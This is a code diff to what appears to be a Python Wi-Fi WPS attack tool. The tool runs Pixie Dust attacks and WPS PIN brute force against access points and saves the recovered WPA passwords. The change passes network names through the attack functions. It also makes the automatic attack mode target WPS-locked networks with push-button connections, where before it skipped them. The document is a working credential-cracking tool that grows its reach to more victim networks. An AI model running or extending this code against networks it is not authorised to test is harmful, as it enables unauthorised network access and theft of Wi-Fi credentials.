@@ -694,7 +694,7 @@ class Companion:
         return False
 
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
-                          pixieforce=False, store_pin_on_fail=False):
+                          pixieforce=False, store_pin_on_fail=False, essid=None):
         if not pin:
             if pixiemode:
                 try:
@@ -726,9 +726,10 @@ class Companion:
             self.__wps_connection(bssid, pin, pixiemode)
 
         if self.connection_status.status == 'GOT_PSK':
-            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+            final_essid = essid or self.connection_status.essid
+            self.__credentialPrint(pin, self.connection_status.wpa_psk, final_essid)
             if self.save_result:
-                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+                self.__saveResult(bssid, final_essid, pin, self.connection_status.wpa_psk)
             if not pbc_mode:
                 # Try to remove temporary PIN file
                 filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
@@ -741,7 +742,7 @@ class Companion:
             if self.pixie_creds.got_all():
                 pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if pin:
-                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True, essid=essid)
                 return False
             else:
                 print('[!] Not enough data to run Pixie Dust attack')
@@ -752,7 +753,7 @@ class Companion:
                 self.__savePin(bssid, pin)
             return False
 
-    def __first_half_bruteforce(self, bssid, f_half, delay=None):
+    def __first_half_bruteforce(self, bssid, f_half, delay=None, essid=None):
         """
         @f_half — 4-character string
         """
@@ -760,13 +761,13 @@ class Companion:
         while int(f_half) < 10000:
             t = int(f_half + '000')
             pin = '{}000{}'.format(f_half, checksum(t))
-            self.single_connection(bssid, pin)
+            self.single_connection(bssid, pin, essid=essid)
             if self.connection_status.isFirstHalfValid():
                 print('[+] First half found')
                 return f_half
             elif self.connection_status.status == 'WPS_FAIL':
                 print('[!] WPS transaction failed, re-trying last pin')
-                return self.__first_half_bruteforce(bssid, f_half)
+                return self.__first_half_bruteforce(bssid, f_half, essid=essid)
             f_half = str(int(f_half) + 1).zfill(4)
             self.bruteforce.registerAttempt(f_half)
             if delay:
@@ -774,7 +775,7 @@ class Companion:
         print('[-] First half not found')
         return False
 
-    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
+    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None, essid=None):
         """
         @f_half — 4-character string
         @s_half — 3-character string
@@ -783,19 +784,19 @@ class Companion:
         while int(s_half) < 1000:
             t = int(f_half + s_half)
             pin = '{}{}{}'.format(f_half, s_half, checksum(t))
-            self.single_connection(bssid, pin)
+            self.single_connection(bssid, pin, essid=essid)
             if self.connection_status.last_m_message > 6:
                 return pin
             elif self.connection_status.status == 'WPS_FAIL':
                 print('[!] WPS transaction failed, re-trying last pin')
-                return self.__second_half_bruteforce(bssid, f_half, s_half)
+                return self.__second_half_bruteforce(bssid, f_half, s_half, essid=essid)
             s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
             if delay:
                 time.sleep(delay)
         return False
 
-    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
+    def smart_bruteforce(self, bssid, start_pin=None, delay=None, essid=None):
         if (not start_pin) or (len(start_pin) < 4):
             # Trying to restore previous session
             try:
@@ -814,13 +815,13 @@ class Companion:
             self.bruteforce = BruteforceStatus()
             self.bruteforce.mask = mask
             if len(mask) == 4:
-                f_half = self.__first_half_bruteforce(bssid, mask, delay)
+                f_half = self.__first_half_bruteforce(bssid, mask, delay, essid=essid)
                 if f_half and (self.connection_status.status != 'GOT_PSK'):
-                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
+                    self.__second_half_bruteforce(bssid, f_half, '001', delay, essid=essid)
             elif len(mask) == 7:
                 f_half = mask[:4]
                 s_half = mask[4:]
-                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
+                self.__second_half_bruteforce(bssid, f_half, s_half, delay, essid=essid)
             raise KeyboardInterrupt
         except KeyboardInterrupt:
             print("\nAborting…")
@@ -865,33 +866,41 @@ class Companion:
 
         green_nets = []
         white_nets = []
+        red_nets = []
         for n, network in networks.items():
             model = '{} {}'.format(network['Model'], network['Model number']).strip()
             # Skip already cracked networks (yellow)
             if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in scanner.stored:
                 continue
-            # Skip locked networks (red) as they cannot be attacked with PIN-based methods
+
             if network['WPS locked']:
+                red_nets.append(network)
                 continue
+
             # Prioritize vulnerable networks (green)
             if vuln_list and (model in vuln_list):
                 green_nets.append(network)
             else:
                 white_nets.append(network)
 
-        if not (green_nets or white_nets):
+        if not (green_nets or white_nets or red_nets):
             print('[i] No vulnerable networks found.')
             return
 
         print(f"Attacking {len(green_nets)} green networks…")
         for network in green_nets:
-            print(f"[*] Attacking {network['ESSID']} ({network['BSSID']})…")
-            self.single_connection(network['BSSID'], pixiemode=True)
+            print(f"[*] Attacking {network['ESSID']} ({network['BSSID']}) with Pixie Dust…")
+            self.single_connection(network['BSSID'], pixiemode=True, essid=network.get('ESSID'))
 
         print(f"Attacking {len(white_nets)} white networks…")
         for network in white_nets:
-            print(f"[*] Attacking {network['ESSID']} ({network['BSSID']})…")
-            self.single_connection(network['BSSID'])
+            print(f"[*] Attacking {network['ESSID']} ({network['BSSID']}) with default PIN…")
+            self.single_connection(network['BSSID'], essid=network.get('ESSID'))
+
+        print(f"Attacking {len(red_nets)} red networks…")
+        for network in red_nets:
+            print(f"[*] Attacking {network['ESSID']} ({network['BSSID']}) with PBC…")
+            self.single_connection(network['BSSID'], pbc_mode=True, essid=network.get('ESSID'))
 
 
 class WiFiScanner:
@@ -1337,6 +1346,7 @@ if __name__ == '__main__':
 
     if args.auto_attack:
         args.write = True
+        print('[i] --auto-attack is enabled, cracked credentials will be saved.')
     while True:
         try:
             companion = Companion(args.interface, args.write, print_debug=args.verbose)
@@ -1357,12 +1367,22 @@ if __name__ == '__main__':
                     args.bssid = scanner.prompt_network()
 
                 if args.bssid:
+                    # Scan for the network to get the ESSID
+                    scanner = WiFiScanner(args.interface)
+                    networks = scanner.iw_scanner()
+                    essid = None
+                    if networks:
+                        for n, network in networks.items():
+                            if network['BSSID'] == args.bssid.upper():
+                                essid = network.get('ESSID')
+                                break
+
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
                     if args.bruteforce:
-                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                        companion.smart_bruteforce(args.bssid, args.pin, args.delay, essid=essid)
                     else:
                         companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
-                                                    args.show_pixie_cmd, args.pixie_force)
+                                                    args.show_pixie_cmd, args.pixie_force, essid=essid)
             if not args.loop:
                 break
             else:
